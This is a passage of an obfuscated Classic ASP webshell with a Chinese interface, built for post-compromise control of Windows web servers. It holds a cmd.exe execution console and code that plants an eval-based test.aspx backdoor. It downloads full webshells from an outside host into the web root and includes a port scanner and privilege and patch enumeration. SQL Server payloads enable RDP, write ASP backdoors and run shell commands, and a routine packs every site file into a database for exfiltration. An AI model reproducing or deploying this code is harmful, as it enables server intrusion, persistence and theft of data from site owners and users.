azn"'% colspan='3","<h2>"&bwy("t")&"下载结果:</h2>"
oiz 4
azn"40%",b("源")
azn"30%",b("目录")
azn"30%",b("文件")
cda
Set ibi=khe(edg(7))
Set fkv=khe(edg(9))
i=0
for each x in split(fbn,br)
ymyurl=split(x,"|")(0)
if ymyurl<>"" then
i=i+1
lgh=""
lgh=split(x,"|")(1)
err.clear
fkv.Open"GET",ymyurl,False
fkv.send
jkv
tez(i mod 2)
azn"40%",ymyurl
If Err Then
j"<td colspan='2'><b>错误1: "&Err.Description&"错误源: "&Err.Source&"</b></td>":err.clear
else
With ibi
.Type=1
.Mode=3
.Open
.Write fkv.ResponseBody
.Position=0
.SavetoFile lgh,2
.Close
End With
If Err Then
j"<td colspan='2'><b>错误2: "&dbi(lgh)&Err.Description&"错误源: "&Err.Source&"</b></td>":err.clear
Else
ggr lgh,lgh
azn"30%",ggr(lgh,ozs)
azn"30%",inw("csw",lgh,lgh)
End If
end if
cda
end if
ept
next
Set ibi=nothing
Set fkv=nothing
end select
if qs="zx" then ysx"n",qaj(lgh,"\"),"":vnz:nxh"n.submit()"
end function
function cdn()
On Error Resume Next
rzd="k952004m09-012k956572m09-012k2393802m11-011k2592799m11-080k2621440m12-0203k2160329m10-048k970483m09-020k2124261m10-065k2271195m10-065k977165m10-015k2360937m10-084k2478960m11-014k2507938m11-056k2566454m11-062k2646524m12-003k2645640m12-009k2641653m12-018k944653m07-067k952004m09-012k971657m09-041k2620712m11-097k942831m08-005k2503665m11-046k2592799m11-080"
if qs="ml" then epf=fbn
if qs="kb" then jmd=fbn
if epf="" then epf="x:\boot.ini"&br&"x:\windows\"&br&"x:\Documents and Settings\"&br&"x:\Program Files\"
for each x in split(rzd,"k")
if x<>"" then gjn=gjn&"KB"&split(x,"m")(0)&"@MS"&split(x,"m")(1)&br
next
if jmd="" then jmd=gjn
jkv
tez 4
azn"'% colspan='2","<h2>"&bwy("t")&"目录扫描:</h2>"
oiz 4
azn 60,"目录文件:":azn"","<textarea name=chml id=chml rows=8 style='width:760px;'>"&epf&"</textarea>"&"<li style='margin-top:5px;'>"&dbi("目录扫描 请在结尾输入 \ 否则视为文件,文件扫描请输出文件绝对路径和文件全名称")&"<li>"&dbi("盘符设置为x,则循环扫描各物理磁盘")
ysx"chxx","","":axu"fbn","",wzp:axu"qs","","":axu"dfz","","cdn":axu"vrn","","post":axu"tve","","post"
oiz 4
azn"","搜索范围:"
azn"",tfw("yfj",1,1,1,0)&"子目录  "&tfw("noy",1,1,1,0)&"包含文件  "&tfw("kxk",1,1,1=1,0)&"显示不可读对象  "&tfw("oyt",1,1,1=1,0)&"显示不可写对象  "&qoi("botton^:qs.value='ml';fbn.value=chml.value;tgt('chxx')","button","开始搜索")
oiz 4
azn"'% colspan='2","<h2>"&bwy("t")&"补丁检测:</h2>"
oiz 4
azn"","补丁列表:"
azn"","<textarea name=jmd id=jmd rows=6 style='width:676px;'>"&jmd&"</textarea>&nbsp;&nbsp;"&qoi("botton^:qs.value='kb';fbn.value=jmd.value;tgt('chxx')","button","开始搜索")
oiz 4
azn"'% colspan='2","<h2>"&bwy("t")&"端口扫描:</h2>"
oiz 4
azn"","IP:"
azn"",qoi("vrn1","text|760","127.0.0.1")
oiz 4
azn"","Port:"
azn"",qoi("tve1","text|713","21,23,80,1433,1521,3306,3389,4899,8080,43"&cmw&"958,65500")&"&nbsp;&nbsp;"&qoi("botton^:qs.value='dk';tgt('chxx')","button","扫描")
vnz
cda
select case qs
case"ml"
yea true
case"kb"
for each y in split(fbn,br)
if y<>"" then
if not cf.fileexists("c:\windows\"&split(y,"@")(0)&".log") and y<>"" then ctj=ctj&replace(y,"@","...")&"...补丁不存在<br>"
end if
next
jkv
oiz 3
azn"","<h2>"&bwy("t")&"检测结果:</h2>"
mbi
azn"",ctj
cda
case"dk"
If Not vzc(vrn,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
j"IP格式不符"
End If
If Not vzc(tve,"^(\d{1,5},)*\d{1,5}$")Then
j"端口格式不符"
End If
j"搜索ing...<br>"
ept
For Each alu In Split(vrn,",")
For Each rzq In Split(tve,",")
lfj alu,rzq
Next
Next
end select
end function
Sub lfj(qsz,wbl)
On Error Resume Next
Dim gwa,jba
Set gwa=khe(edg(12))
jba="Provider=SQLOLEDB.1;Data Source="&qsz&","&wbl&";User ID=lake2;Password=lake2;"
gwa.ConnectionTimeout=1
gwa.open jba
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
j"<label>"&qsz&":"&wbl&"</label>&nbsp;<label> close</label><br>"
Else
j"<label>"&qsz&":"&wbl&"</label>&nbsp;<label>"&dbi(" open")&"</font></label><br>"
End If
ept
End If
End If
End Sub
Function ovb(gej,utl,zui,gnu)
On Error Resume Next
i=1
ovb=0
dim slv,chu,ver,rrs
slv=1
lfy=gej&cf.GettempName
Set f=cf.GetFolder(gej)
if gnu=0 then
if err.number=0 then ovb=1
err.clear
exit function
end if
if err then
chu=ict
if utl=0 then slv=0
ovb=1
else
chu=kiq
end if
err.clear
cf.CreateTextFile(lfy)
if err then
ver=ict
if zui=0 then slv=0
else
ver=kiq
end if
cf.DeleteFile(lfy)
err.clear
rrs=bwy(0)&cvp(gej,dbi(gej))
if klj then i=0:rrs=bwy(0)&cvp(gej,gej)
if slv=1 and (klj or cf.folderexists(gej)) then 
jkv
tez i
j uda("fo")
azn"",rrs
azn"30c",chu
azn"30c",ver
cda
end if
end Function
function ucs(cpo,utl,zui)
On Error Resume Next
dim bnp,msq,ihi
bnp=1
if clng(cf.GetFile(cpo).size/1024)<1024 then
set getAtt=khe(edg(7))
getAtt.Type=2
getAtt.mode=3 
getAtt.open
getAtt.loadfromfile(cpo)
getAtt.readtext
else
sdflj
end if
if err then
msq=ict
if utl=0 then bnp=0
else
msq=kiq
end if
getAtt.Close 
set getAtt=Nothing
err.clear
set getAtt=cf.GetFile(cpo)
getAtt.Attributes=getAtt.Attributes
if err then
ihi=ict
if zui=0 then bnp=0
else
ihi=kiq
end if
err.clear
ucs=Err.Number 
set getAtt=Nothing  
if bnp=1 and cf.FileExists(cpo) then 
jkv
tez 1
j uda("fi")
dim wqi
wqi=mid(cpo,instr(1,cpo,wcv,1),len(wcv))
azn"",bwy(LCase(qaj(cpo,".")))&inw("csw",cpo,replace(cpo,wcv,dbi(wqi),1,-1,1))
azn"30c",msq
azn"30c",ihi
cda
end if
end function
function bww()
On Error Resume Next
dim soy
soy=split("php,jsp,aspx",",")
ysx"ob",kxi,""
axu"dfz","","ulz"
axu"fom","",""
jkv
tez 4
if fom="de" then
cf.DeleteFile(server.mappath("test.aspx"))
cf.DeleteFile(server.mappath("test.php"))
cf.DeleteFile(server.mappath("test.jsp"))
azn"'% colspan='3' height='100'c","删除完毕!"
else
cf.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo∩_∩oo'?><?php phpinfo()?>"
cf.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo∩_∩oo"
cf.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo∩_∩oo"
for each x in soy
azn"c","<iframe src=test."&x&" width=300 height=100></iframe>"
next
oiz 4:azn"'% colspan='3'c",qoi("^:fom.value='de';tgt('ob')","button","删除测试文件")
end if
vnz
ysx"chyy",kxi,"":axu"fbn","","":axu"qs","","":axu"dfz","","mdr"
oiz 4
for each x in soy
azn"c",qoi("botton^:fbn.value='"&ohp("http://aspmuma.net/web/"&x&".txt|"&Server.MapPath("test."&x))&"';qs.value='zx';tgt('chyy')","button","下载"&x&"大"&"马")
next
vnz
cda
End function
function val()
On Error Resume Next
ysx"qgj",kxi,"fileframe":axu"dfz","",0:axu"fbn","",0:vnz
Dim mso(6,2)
mso(0,1)="c:\windows\sys"&ocz&"tem32\sethc.exe"
mso(0,2)="shi"&"ft后"&"门"
mso(1,1)="c:\windows\sys"&ocz&"tem32\dllcache\sethc.exe"
mso(1,2)=mso(0,2)
mso(2,1)="c:\windows\sys"&ocz&"tem32\magnify.exe"
mso(2,2)="放大"&"镜后"&"门"
mso(3,1)="c:\windows\sys"&ocz&"tem32\dllcache\magnify.exe"
mso(3,2)=mso(2,2)
mso(4,1)="c:\windows\my.ini"
mso(4,2)="mysql数据库配置文件"
mso(5,1)="C:\Documents and Settings\All Users\「开始」菜单\程序\Gene6 FTP Server.lnk"
mso(5,2)="Gene6 FTP"
nyd"服务器后门检测",4,1
jkv
tez 4
azn"",pel(b("后门种类"))
azn"",pel(b("文件名"))
azn"80",pel(b("大小"))
azn"30c",pel(b("属性"))
azn"150c",pel(b("最后修改时间"))
azn"150c",pel(b("创建时间"))
azn"150c",pel(b("最后访问时间"))
for i=0 to 5
set f=cf.getfile(mso(i,1))
if err.number=0 then
oiz 0
azn"",mso(i,2)
azn"",inw("mbh",mso(i,1),mso(i,1))
azn"",f.size/1024&" k"
azn"c",f.Attributes
azn"c",f.DateLastModified
azn"c",f.DateCreated
azn"c",f.DateLastAccessed
end if
set f=nothing
err.clear
next
cda
end function
'!>
function rzp()
On Error Resume Next
dim arg,npy,zux
ysx"qgj",kxi,"_blank":axu"dfz","",0:axu"fbn","",0:vnz
nxh"function d(id){var o=document.getElementById(id);if(o.style.display==''){o.style.display='none';}else{o.style.display='';}}"
klj=true
j"<div id=z style='font-size:20px;'></div>"
eyd
cda
dim zgm
zux=3
f=0
zgm=false
nkt
'<!
nyd"危险目录检测",2,1
jkv
tez 5:j"<td width='50%'>"
bub"100%"
tez 4
azn"",pel(b("目录名称"))
azn 30,pel(b("可读"))
azn 30,pel(b("可写"))
cda
for each x in cf.drives
if ovb(x&"\",1,1,1)=0 then
if x=split(kyv,"\")(0) then
end if
f=f+1
else
if x=split(kyv,"\")(0) then
zgm=true
end if
end if
xvb=xvb&","&x&"\recycler"
next
if f>0 then zux=zux-1
arg="有 "&dbi(f)&" 个磁盘根目录可以访问！<br>":f=0
e=ubound(split(kyv,"\"))
if zgm then
for a=0 to e
d=""
for c=0 to e-a
d=d&split(kyv,"\")(c)&"\"
next
if ovb(d,0,1)=0 and f<a then f=a
next
arg=arg&"web根目录以上 "&dbi(f)&" 级目录可读；如大于3级，服务器则有可能存在跨站跨目录漏洞！"
else
arg=arg&"web根目录所在磁盘根目录 "&dbi(split(kyv,"\")(0))&" 可以访问!"
end if
j"</td>"
azn"",arg
cda
cda
if btt(edg(1)) or btt(edg(2)) then zux=zux-1
select case zux
case 1:zux="低"
case 2:zux="中"
case 3:zux="高"
end select
nxh"z.innerHTML='服务器安全指数:"&dbi(zux)&"';"
'!>
nyd"常用组件检测",1,1
jkv
'<!
tez 4
'ysx"ob",kxi,""
'j zph("fbn")
'axu"dfz","","rzp" '"ybt"
'axu"fbn","",""
azn"'% colspan='2",qoi("fbn1","text|300",fbn)&"&nbsp;"&qoi("^:alt('qgj').target='';uct('rzp',fbn1.value)","button","检测")&"&nbsp;&nbsp;&nbsp;"&iif(fbn<>"",fbn&iif(btt(fbn),kiq,ict),"")
'vnz
'!>
for i=0 to 10
oiz 0
azn"50%",iif(btt(edg(i)),kiq,ict)&edg(i)
azn"50%",iif(btt(edg(i+11)),kiq,ict)&edg(i+11)
if btt(edg(i)) then f=f+1
next
arg="存在 "&dbi(f)&" 个高危组件！"
f=0:cda
nxh"y1.innerHTML='　　"&arg&"';"
cda
'<!
val:rza
'!>
end function
end class
Class UUPC
Dim D1,D2
Public function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FFIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,jrg,T2,mhi,TFL,SFV,glw,gne,feu,nqh,gjo
set D1=khe(edg(11))
if Request.TotalBytes<1 then Exit Sub
set T1=khe(edg(7))
T1.Type=1:T1.Mode=3 : T1.Open
T1.Write Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa=T1.Read : feu=1
nqh=LenB(TDa)
set D2=khe(edg(11))
vbCrlf=chrB(13) & chrB(10)
set T2=khe(edg(7))
TSt=MidB(TDa,1,InStrB(feu,TDa,vbCrlf)-1)
mhi=LenB (TSt)
feu=feu+mhi+1
while (feu + 10) < nqh
jrg=InStrB(feu,TDa,vbCrlf & vbCrlf)+3
T2.Type=1 : T2.Mode=3 : T2.Open
T1.Position=feu
T1.CopyTo T2,jrg-feu
T2.Position=0 : T2.Type=2 : T2.Charset="gb2312"
TIn=T2.ReadText : T2.Close
feu=InStrB(jrg,TDa,TSt)
glw=InStr(22,TIn,"name=""",1)+6
gne=InStr(glw,TIn,"""",1)
gjo=lcase(Mid (TIn,glw,gne-glw))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FFIF
glw=InStr(gne,TIn,"filename=""",1)+10
gne=InStr(glw,TIn,"""",1)
glw=InStr(gne,TIn,"Content-Type: ",1)+14
gne=InStr(glw,TIn,vbCr)
TFL.gxo=jrg
TFL.pxm=feu -jrg -3
if not D2.Exists(gjo) then
D2.add gjo,TFL
end if
else
T2.Type=1 : T2.Mode=3 : T2.Open
T1.Position=jrg : T1.CopyTo T2,feu-jrg-3
T2.Position=0 : T2.Type=2
T2.Charset="gb2312"
SFV=T2.ReadText
T2.Close
if D1.Exists(gjo) then
D1(gjo)=D1(gjo)&", "&SFV
else
D1.Add gjo,SFV
end if
end if
feu=feu+mhi+1
wend
TDa=""
set T2=nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close
set T1=nothing
end if
End Sub
End Class
Class FFIF
dim pxm,gxo
Private Sub Class_Initialize
pxm=0
gxo=0
End Sub
Public function tsj(F)
dim T3
tsj=true
if trim(F)="" or gxo=0 then exit function
set T3=khe(edg(7))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=gxo
T1.copyto T3,pxm
T3.SaveToFile F,2
T3.Close
set T3=nothing
tsj=false
end function
End Class
function ybt()
j"<center><br><br><br><br><br>"&fbn&iif(btt(fbn),kiq,ict)&"</center>"
end function
'<!
Sub vyd(rmq,eik,rs,ibi)
On Error Resume Next
Dim fpy,xll,mvh
set mvh=khe(edg(0))
puf=Lcase(puf)
Set xll=mvh.GetFolder(eik)
If Err Then okv Err
For Each fpy In xll.Files
If Not(vzc(qaj(fpy.name,"."),"^("&cjn&")$") Or Lcase(fpy.Name)=mdbName Or Lcase(fpy.Name)=mdbName2)Then
rs.AddNew
rs("binPath")=Replace(fpy.Path,rmq&"\","")
ibi.LoadFromFile(fpy.Path)
rs("binContent")=ibi.Read()
rs.Update
j fpy.Path&" ...... "
j iif(err>0,ict&" ...... "&Err.Description,kiq)
j"<br>"
err.clear
ept
End If
Next
For Each fpy In xll.SubFolders
If Not vzc(fpy.name,"^("&puf&")$")Then
vyd rmq,fpy.Path,rs,ibi
End If
Next
set mvh=Nothing
Set xll=Nothing
End Sub
Sub bjx()
On Error Resume Next
Server.ScriptTimeOut=5000
rmq=session("eoz")
pjz=Server.MapPath(khe(edg(0)).GetTempName&".mdb")
Dim rs,jba,mgl
Set rs=khe(edg(15))
Set ibi=khe(edg(7))
Set mgl=khe(edg(13))
mdbName=qaj(pjz,"\")
jba="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&pjz
mgl.Create jba
Set gwa=khe(edg(12))
gwa.Open jba
if err Then okv err
gwa.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,binPath VarChar,binContent Image)")
If Err Then okv Err
ibi.Open
ibi.Type=1
rs.Open"FileData",gwa,3,3
mdbName=Lcase(mdbName)
mdbName2=Replace(mdbName,".mdb",".ldb")
vyd rmq,rmq,rs,ibi
rs.Close
siz
ibi.Close
Set rs=Nothing
Set ibi=Nothing
Set mgl=Nothing
If Err Then
okv(Err)
Else
ysx"qgj",kxi,"filelist":axu"dfz","",0:axu"fbn","",0:vnz
znj drb(qaj(pjz,"\"),"target='_blank'",pjz)
End If
j wzr
End Sub
Sub siz()
On Error Resume Next
If IsObject(gwa)Then
gwa.Close
Set gwa=Nothing
End If
End Sub
'!>
function b(str)
b="<b>"&str&"</b>"
end function
Function qaj(str,cbq)
If str="" Or InStr(str,cbq)<1 Then
qaj=""
Exit Function
End If
qaj=Mid(str,InstrRev(str,cbq)+Len(cbq))
End Function
Function jww(str,cbq,mwe)
If str="" Or InStr(str,cbq)<1 Then
jww=""
Exit Function
End If
If mwe Then
jww=Left(str,InStr(str,cbq)-1)
Else
jww=Left(str,InstrRev(str,cbq)-1)
End If
End Function
function bjw(gbe)
bjw=qoi("^:if("&gbe&".rows>3)"&gbe&".rows-=3","button|25","-")&qoi("^:"&gbe&".rows+=3","button|25","+")
end function
sub ysx(i,a,t)
j"<form name="""&i&""" id="""&i&""" method=""post"" action="""&a&""""
if t<>"" then j" target="""&t&""""
j" >"
end sub
sub vnz()
j"</form>"
end sub
function qoi(i,t,v)
dim jbn,z,r,w,y
if instr(i,"^")>0 then
y=split(i,"^")(1)
select case left(y,1)
case ":" w=" onclick"
case ";" w=" onchange"
end select
w=w&"=""javascript:"&mid(y,2)&";"""
i=split(i,"^")(0)
end if
z=split(t,"|")
if t="" then t="hidden"
if ubound(z)>0 then
t=z(0)
jbn=z(1)
else
jbn="100%"
end if
r="<input type="""&t&""" name="""&i&""" id="""&i&""""
if t="text" or ubound(z)>0 then r=r&" style=""width:"&jbn&";"""
if trim(v)<>"0" then r=r&" value="""&v&""""
qoi=r&w&">"
end function
sub axu(i,t,v)
if i="dfz" then j qoi(i&"1",t,v)
j qoi(i,t,v)
end sub
function tfw(i,t,v,k,r)
tfw=qoi(i,iif(t=1,"checkbox","radio")&""" "&iif(k,"checked","")&" class=""radio",v)
if r=1 then j tfw
end function
Function xtu(str)
On Error Resume Next
str=CStr(str)
If IsNull(str)Or str=""Then
xtu=""
Exit Function
End If
xtu=Server.HtmlEncode(str)
End Function
Function IIf(var,iwt,fsr)
If var=True Then IIf=iwt Else IIf=fsr
End Function
function dbi(str)
dbi="<font color="&cl(16)&">"&str&"</font>"
end function
function pel(str)
pel="<font color=blue>"&str&"</font>"
end function
sub div(str,stb)
j"<div style='margin:"&stb&"px;'>"&str&"</div>"
end sub
sub rlt(str)
j"<h2>"&str&"</h2>"
end sub
sub lrm(str)
j"<h3 style='background-color:"&cl(0)&"'>"&bwy("t")&str&"</h3>"
end sub
function nlq(rtn)
nlq="<table width="""&rtn&"""border=""0""cellpadding=""0""cellspacing=""0"">"
end function
sub bub(rtn):j nlq(rtn):end sub
sub jkv():bub"100%":end sub
function lps(iiu)
dim fcw
if iiu=1 then fcw=cl(3)
if iiu=0 then fcw=cl(1)
if iiu=3 then fcw=cl(0)
if iiu=2 then fcw=cl(7)
lps="<tr style=""background-color:"&fcw&""""
if iiu<2 then lps=lps&" onmouseover=""javascript:this.style.backgroundColor='"&cl(7)&"';"" onmouseout=""javascript:this.style.backgroundColor='"&fcw&"';"""
lps=lps&">"
End function
function nmp(iiu)
nmp="</tr>"&lps(iiu)
end function
sub tez(iiu)
j lps(iiu)
end sub
sub oiz(iiu)
j nmp(iiu)
end sub
function thr(rtn,td)
If td=""Or IsNull(td)Then td=dbi("Null")
thr="<td"
if right(rtn,1)="c" then
thr=thr&" width='"&mid(rtn,1,len(rtn)-1)&"' align='center'"
else
If isnumeric(rtn) or instr(rtn,"%")>0 Then
thr=thr&" width='"&rtn&"'"
else 
if rtn<>"" then thr=thr&" nowrap "
end if
end if
thr=thr&">"&CStr(td)&"</td>"
End function
sub azn(rtn,td)
j thr(rtn,td)
end sub
sub cda()
j"</tr></table>"
end sub
Sub mbi()
j"<tr>"
End Sub
Function dpt(str,xze)
objRe.Pattern=xze
Set dpt=objRe.Execute(str)
End Function
sub yqn()
On Error Resume Next
dim dqs
qqs="http://"&oys("SERVER_NAME")&":"&oys("SERVER_PORT")&jww(oys("PATH_INFO"),"/",False)&"/"&xky&"?"&oys("QUERY_STRING")
Set fkv=khe(edg(9))
Set ibi=khe(edg(7))
fkv.Open"GET",qqs,False
fkv.send
If vzc(fkv.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
dqs=Trim(regReplace(dpt(fkv.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
ElseIf vzc(fkv.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
dqs=Trim(regReplace(dpt(fkv.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
End If
if dqs="" then dqs=pxx
With ibi
.Type=2
.Open
.WriteText fkv.responseBody
.Position=0
.CharSet=dqs
.Position=2
j .ReadText(.Size)
.close
End With
Set ibi=Nothing
Response.status=fkv.status
Response.end
end sub
sub kgf()
For Each queryContent In request.queryString
execute queryContent&"=request.queryString("""&queryContent&""")"
Next
For Each queryContent In request.Form
execute queryContent&"=zph("""&queryContent&""")"
Next
end sub
Sub okv(Err)
If Err Then
j"<hr style='color:"&cl(13)&";'/><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><li><a href='javascript:history.go(-1)'>"&dbi("返回")&"</a></li><br/><hr style='color:"&cl(13)&";'/>"
Err.Clear
Response.End
End If
End Sub
Sub znj(str)
wzr=wzr&"<li>"&str&"</li>"
End Sub
Sub nxh(rjs)
j vbNewLine & "<script type=""text/javascript"">" & rjs & "</script>" & vbNewLine
End Sub
'<!
Function cfv()
On Error Resume Next
Dim oli
if qsx="" then wschd="1":qsx="/c set"
if ltv<>"" then session("ltv")=ltv
if session("ltv")="" then session("ltv")="cmd.exe"
ysx"docm",kxi,""
axu"dfz","","cfv"
axu"ltv","",""
axu"gjy","","go"
axu"qsx","",""
vnz
bub"100%"" height=""100%":tez 4:j"<td>"
bub"1000px"" align=""center"" height=""100%"
tez 4
azn 70,"CMD 路径:"
azn 860,qoi("ltv1","text",Session("ltv"))
azn 70,tfw(wschd,1,1,1,0)&"WScript"
oiz 4
azn"","执行语句:"
azn"",qoi("qsx1","text",xtu(qsx))
azn"",qoi("button^:tgt('docm')","button","执 行")
If gjy<>"" Then
bys
if wschd="" then
oli=uuf.exec(ltv&" "&qsx).stdout.readall
else
Set fso=khe(edg(0))
szTempFile=server.mappath("cmd.txt")
uuf.Run ltv&" "&qsx&" > "&szTempFile,0,True
oli=Server.HTMLEncode(fso.OpenTextFile(szTempFile,1,False,0).ReadAll)
fso.DeleteFile szTempFile,True
end if
End If
oiz 4
azn"'% height='100%'colspan='3","<textarea readonly Style='width:998;height:100%;'>"&oli&"</textarea>"
oiz 4:j"<td width='100%' colspan='3'>"
okv(err)
cda:cda
End Function
zqr=647
accessStr="Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
sHeader="<h3><font face=webdings>8</font> {$s}</h3><table width=100% border=0 cellpadding=0 cellspacing=0>"
SqlSelect="<select onchange=""javascript:if(this.form.fdi)this.form.fdi.value=this.value;else this.form.sql.value=this.value;""><option value=''>SQL Server常用操作列表<option value=""exec ma"&yyl&"ster.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentC"&pmj&"ontrolSet\Control\Term"&ujr&"inal Server','fDenyTSConnections','REG_DWORD',0"">打开3389端口<option value=""exec ma"&yyl&"ster.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentC"&pmj&"ontrolSet\Control\Term"&ujr&"inal Server','fDenyTSConnections','REG_DWORD',1"">关闭3389端口<option value=""EXEC [ma"&yyl&"ster].[dbo].[xp_subdirs] 'c:\'"">XP_CMDShell读取目录<option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''<%ex"&"e"&"cu"&"te(re"&"qu"&"est(c"&"hr(35)))" & Chr(37) & ">''' "">sp_makewebtask写文件" & _
 "<option value=""select * from [jnc]"">查看jnc临时表内容<option value=""DROP TABLE [jnc];exec ma"&yyl&"ster..xp_regwrite 'HKEY_LOCAL_MACHINE','SOF"&fse&"TWARE\Microsoft\Jet\4.0\Engi"&tzv&"nes','San"&bqy&"dBoxMode','REG_DWORD',1;select * from openrowS"&igb&"et('microsoft.jet.oledb.4.0',';database=c:\winnt\sys"&ocz&"tem32\ias\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');"">xp_regwrite临时数据删除<option value=""DROP TABLE [jnc];declare @o int exec sp"&gnt&"_oacreate '"&edg(1)&"',@o out exec sp_"&ukq&"oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"">sp"&gnt&"_oacreate临时数据删除</select> "
rmq=Replace(zph("rmq"),"\\","\")
roy=split("xp_cmdshell,sp"&gnt&"_oacreate,xp_regwrite",",")
sqldlla=split("xpl"&cyn&"og70.dll,odsole70.dll,xpstar.dll,xprepl.dll",",")
sqldllb=split("xp_cmdshell,Ole Automation Procedures,Ad Hoc Distributed Queries",",")
if npv="" then npv="127.0.0.1"
if tyg="" then tyg="1433"
if zen="" then zen="s"&"a"
if rpu="" then rpu="Pa"&"ssW"&"ord"
if naz="" then naz="systeminfo"
Sub nib()
nxh"function yot(cmd,str){var j=0;var strTmpB;var strTmp=str;strTmpB=frm.dfz.value;if(str&&str.indexOf('*')!= -1){str=str.split('*')[0];strTmp=strTmp.split('*')[1];}if(cmd=='nfe'){if(str=='0'){str=1;}else{frm.reset();}frm.theAct.value=cmd;frm.param.value=str;}frm.submit();frm.target='';frm.dfz.value=strTmpB;frm.reset();}function cdb(column,str){if(!str)return;frm.reset();frm.theAct.value='edit';frm.param.value=column+'!'+str;frm.target='_blank';frm.submit();frm.target='';}function kvo(column,str){if(!str)return;if(!confirm('确认要删除这条记录?'))return;frm.reset();frm.theAct.value='del';frm.param.value=column+'!'+str;frm.target='_blank';frm.submit();frm.target='';}function vzm(pzk){frm.mro.value=pzk;yot('nfe','0');}function lbf(pmx,sgo,pzw,vya,gng){var iCurrPage;if(pzw <= 1){return false;}if(pmx>pzw){pmx=pzw;}iCurrPage=Math.ceil(pmx/vya);document.write(""<div align=\""left\"">&nbsp;"");document.write(""共""+sgo+""条记录, ""+pzw+""页&nbsp;"");document.write(""<a href=\""javascript:yot('nfe','1');\""><font face=\""Webdings\"">9</font></a>"");if(iCurrPage>1){document.write(""<a href=\""javascript:yot('nfe','"" + ((iCurrPage-2)*vya+1) + ""');\""><font face=\""Webdings\"">7</font></a>&nbsp;"");}else{document.write(""<font face=\""Webdings\"">7</font>&nbsp;"");}for(var i=(iCurrPage-1)*vya+1;i<=iCurrPage*vya;i++){if(i>pzw){break;}document.write(""<a href=\""javascript:yot('nfe','""+i+""');\"">"");if(i==pmx){document.write(""<strong>"" + i + ""</strong>"");}else{document.write(i);}document.write(""</a>&nbsp;"");}if(iCurrPage<Math.ceil(pzw/vya)){document.write(""<a href=\""javascript:yot('nfe','""+(iCurrPage*vya+1)+""');\""><font face=\""Webdings\"">8</font></a>"");}else{document.write(""<font face=\""Webdings\"">8</font>"");}document.write(""<a href=\""javascript:yot('nfe','""+pzw+""');\""><font face=\""Webdings\"">:</font></a>"");if(Math.ceil(pzw/vya)>=2){document.write(""&nbsp;<input id=\""page\"" value=\""""+pmx+""\"" style=\""width:24px;text-align:center;\"" /><input type=\""button\"" value=\""GO\"" onclick=\""javascript:yot('nfe',document.getElementById('page').value);\"" />"");}document.write(""&nbsp;</div>"");}"
ysx"frm",kxi,""
If theAct <> "" And theAct <> "nfe" And theAct <> "rku" Then
ejx()
vnz
Response.End()
End If
ldc()
Select Case theAct
Case "nfe"
cez()
Case "rku"
rku()
End Select
vnz
End Sub
Sub ldc()
dim vgm,iul
vgm=iif(rmq="sql:s" or rmq="","block","none")
iul=iif(vgm="block","none","block")
axu"dfz","","nib"
axu"theAct","",""
axu"param","",""
j Replace(sHeader,"{$s}","Access + SQL Server 数据库操作")
j"<td height=50 align=center>"
bub"700"
tez 0
j"<td width=90><select onchange=""javascript:if(this.value=='sql:s'){s0.style.display='block';s1.style.display='none';}else{s0.style.display='none';s1.style.display='block';}this.form.rmq.value=this.value;""><option value='sql:s'>SQL Server<option value='DataSource;rsq;PassWord;'>MDB<option value='sql:Dsn=DsnName;'>数据源"
if rmq="" then rmq="sql:s"
j"</select></td><td id='s1' width='550' style='display:"&iul&";'>"
axu"rmq","text",xtu(rmq)
j"</td><td id='s0' width='550' style='display:"&vgm&";'>Ip:"
axu"npv","text|95",xtu(npv):j" Port:"
axu"tyg","text|40",xtu(tyg):j" Uid:"
axu"zen","text|80",xtu(zen):j" Pwd:"
axu"rpu","text|80",xtu(rpu):j" DataBase:"
axu"sqdb","text|70",xtu(sqdb)
j"</td>"
azn"c",qoi("Submit^:this.form.theAct.value='rku'","submit","提 交")
cda:j"</td>"
cda
End Sub
Sub rku()
Dim mhj,vta,dta,jcl,agb
On Error Resume Next
qpr()
Set Cat=khe(edg(13))
Cat.ActiveConnection=gwa.ConnectionString
jkv
if cut then dpq:zqr=474
oiz 3
azn"","SQL 语句："
azn"",SqlSelect&"<textarea id=sql name=sql rows=1 style='width:"&zqr&"px;'></textarea> <input type=""button"" value=""查 询"" onclick=""javascript:this.form.theAct.value='cez';yot('nfe','0');"">"&bjw("sql")
cda
j Replace(sHeader,"{$s}","数据表及结构查看")
tez 2:j"<td width='20%' valign=top>"
jkv
dta=IIf(cut=True,"4","6")
